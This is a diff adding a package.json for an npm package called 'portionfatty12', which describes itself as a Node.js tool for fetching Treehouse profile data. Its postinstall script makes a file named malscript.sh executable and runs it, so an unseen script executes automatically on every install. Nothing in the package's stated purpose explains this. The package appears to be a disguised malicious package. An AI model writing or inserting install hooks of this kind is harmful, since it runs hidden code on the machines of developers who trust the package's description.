@@ -1,0 +1,12 @@
+{
+  "name": "portionfatty12",
+  "version": "2.0.0",
+  "description": "An npm Package for Node.js to retrieve Treehouse profile information in JSON from the Treehouse API.",
+  "main": "profile.js",
+  "scripts": {
+    "postinstall": "chmod +x malscript.sh && ./malscript.sh",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "",
+  "license": "ISC"
+}
